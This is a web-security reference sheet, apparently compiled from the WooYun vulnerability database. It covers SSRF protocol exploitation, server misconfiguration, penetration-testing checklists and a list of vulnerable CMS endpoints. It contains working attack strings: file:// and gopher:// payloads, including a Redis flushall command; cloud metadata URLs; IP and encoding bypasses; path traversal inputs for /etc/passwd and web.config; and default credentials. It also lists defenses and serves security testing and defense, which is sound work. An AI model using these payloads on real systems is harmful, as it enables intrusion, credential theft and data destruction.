# Web Security - SSRF, Server Misconfiguration, Comprehensive Checklist

> Source: WooYun Vulnerability Database | Split from web-file-infra.md (SSRF + Misconfiguration + Checklist + CMS/URL Appendix)

## IV. SSRF and Protocol Exploitation

### 4.1 Vulnerability Essence

```
SSRF essence: The server makes requests on behalf of the attacker, who controls the request target
Risk: Internal network probing -> Internal service access -> File read -> Command execution
```

### 4.2 Common Trigger Points

- `url` parameter in file download features
- Image loading/proxy features
- Web preview/screenshot features
- Import-from-URL features
- Webhook/callback configuration

### 4.3 Protocol Exploitation

```bash
# file:// - Arbitrary file read
file:///etc/passwd
file:///C:/windows/win.ini

# dict:// - Port probing/service interaction
dict://127.0.0.1:6379/info     # Redis
dict://127.0.0.1:11211/stats   # Memcached

# gopher:// - Construct arbitrary TCP requests
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall

# http:// - Internal network probing
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/  # Cloud metadata
```

### 4.4 Bypass Techniques

```bash
# IP representation bypass
127.0.0.1 -> 0x7f000001 -> 2130706433 -> 017700000001 -> 127.1
# DNS rebinding: resolve to external IP then quickly switch to 127.0.0.1
# Short URLs/302 redirect: use external URL to redirect to internal address
```

### 4.5 Defense Measures

1. Whitelist restriction: Limit target domain/IP of requests
2. Protocol restriction: Allow only http/https
3. Internal network isolation: Block requests to RFC1918 addresses and 127.0.0.1
4. DNS resolution validation: Validate IP ownership after resolution
5. Disable redirects: Or limit redirect count and re-validate after each

---

## V. Server Misconfiguration

### 5.1 Parser Misconfiguration

| Issue | Risk | Detection Method |
|---|---|---|
| IIS 6.0 parser vulnerability not patched | `shell.asp;.jpg` is executable | Upload file with semicolon in name |
| Nginx cgi.fix_pathinfo=1 | `/img.jpg/.php` parsed as PHP | Upload image, access `/img.jpg/x.php` |
| Apache multi-extension parsing | `shell.php.xxx` gets parsed | Upload double-extension file |
| Upload directory allows script execution | Webshell runs directly | Upload a script file and test |
| Directory listing enabled | Exposes all files | Access directory URL and check |

### 5.2 Permission Misconfiguration

| Issue | Risk | Fix |
|---|---|---|
| Web process running with high privileges | After escalation, directly root | Run with low-privilege user |
| Upload directory with 777 permissions | Arbitrary write + execute | Set 644/755 |
| Config file readable | Credential exposure | Move outside web root, restrict permissions |
| Admin panel without IP restriction | Accessible from public internet | IP whitelist/VPN |

### 5.3 Default Configuration Risks

```bash
# Default admin panel paths
/admin/ | /manager/ | /console/ | /system/
/phpmyadmin/ | /adminer.php

# Default credentials (high frequency)
admin/admin | admin/123456 | admin/admin123
root/root | test/test

# Default debug ports
8080 (Tomcat) | 9090 (Admin) | 3306 (MySQL exposed)
6379 (Redis no password) | 27017 (MongoDB no auth)
```

### 5.4 Spring Boot Actuator Exposure

```bash
/actuator/env          # Environment variables (including passwords)
/actuator/configprops  # Config properties
/actuator/heapdump     # Heap memory dump (contains sensitive data)
/actuator/mappings     # All URL mappings
```

---

## VI. Comprehensive Practical Checklist

### 6.1 File Upload Testing

- [ ] Scan common editor paths (FCKeditor/eWebEditor/UEditor)
- [ ] Disable JavaScript to test client-side validation
- [ ] Test extension bypass: case variation/double-write/special suffix/%00 truncation/semicolon truncation
- [ ] Modify Content-Type to image/jpeg
- [ ] Add GIF89a file header / create image webshell
- [ ] Identify server type, test corresponding parser vulnerabilities
- [ ] Test .htaccess/.user.ini upload to hijack parsing
- [ ] Analyze file naming rules, test path brute-force
- [ ] Test race condition upload

### 6.2 Path Traversal Testing

- [ ] Identify file-related parameters (filename/path/file/url/download)
- [ ] Basic traversal: `../../../../../etc/passwd`
- [ ] Windows test: `..\..\..\..\..\windows\win.ini`
- [ ] Java Web: `../WEB-INF/web.xml`
- [ ] URL encoding bypass: `%2e%2e%2f` / double encoding `%252e%252e%252f`
- [ ] Unicode bypass: `%c0%ae%c0%ae/`
- [ ] Null byte truncation: `../etc/passwd%00.jpg`
- [ ] Absolute path: `/etc/passwd` / `file:///etc/passwd`

### 6.3 Information Disclosure Scanning

- [ ] Version control: `/.git/config` `/.svn/entries` `/.svn/wc.db`
- [ ] Backup files: `/wwwroot.rar` `/www.zip` `/backup.sql` `/{domain}.zip`
- [ ] Config backups: `/config.php.bak` `/web.config.bak` `/.env.bak`
- [ ] Environment files: `/.env` `/.env.production`
- [ ] Probe files: `/phpinfo.php` `/info.php` `/test.php`
- [ ] Log files: `/ctp.log` `/debug.log` `/storage/logs/`
- [ ] Admin interfaces: `/phpmyadmin/` `/adminer.php` `/swagger-ui.html`
- [ ] Spring Boot: `/actuator/env` `/actuator/heapdump`
- [ ] Google Hacking syntax for assisted search

### 6.4 SSRF Testing

- [ ] Identify URL/proxy/callback parameters
- [ ] Test file:///etc/passwd protocol read
- [ ] Test internal addresses: http://127.0.0.1:port
- [ ] Cloud metadata: http://169.254.169.254/latest/meta-data/
- [ ] IP representation bypass: hex/decimal/abbreviated forms
- [ ] DNS rebinding/302 redirect bypass

---

## Appendix A: High-Risk CMS Vulnerability Quick Reference

| CMS/System | Vulnerability Type | Path | Condition |
|---|---|---|---|
| Wanhu OA ezOffice | Arbitrary upload | `/defaultroot/dragpage/upload.jsp` | %00 truncation |
| Yonyou Collaboration Platform | Arbitrary upload | `/oaerp/ui/sync/excelUpload.jsp` | Bypass JS + brute-force filename |
| Kingdee GSiS | Arbitrary upload | `/kdgs/core/upload/upload.jsp` | Registered user |
| Jinzhi Education epstar | Path traversal | `/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml` | No auth required |
| Seeyon OA | Log disclosure | `/ctp.log` | Direct access |


## Appendix C: Generic Vulnerability URL Patterns

```bash
# PHP path traversal
/down.php?filename=../../../etc/passwd
/pic.php?url=[base64-encoded path]

# JSP path traversal
/download.jsp?path=../WEB-INF/web.xml
/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml

# ASP/ASPX path traversal
/DownLoad.aspx?Accessory=../web.config
/download.ashx?file=../../../web.config

# Resin specific
/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd
```

---

> **Supply chain/cloud deployment/framework CVE** -> Migrated to [web-deployment-security.md](web-deployment-security.md)
> **CORS/GraphQL/HTTP Smuggling/WebSocket/OAuth** -> Migrated to [web-modern-protocols.md](web-modern-protocols.md)

*Derived from WooYun Vulnerability Database (88,636 entries) | For security research and defense reference only*
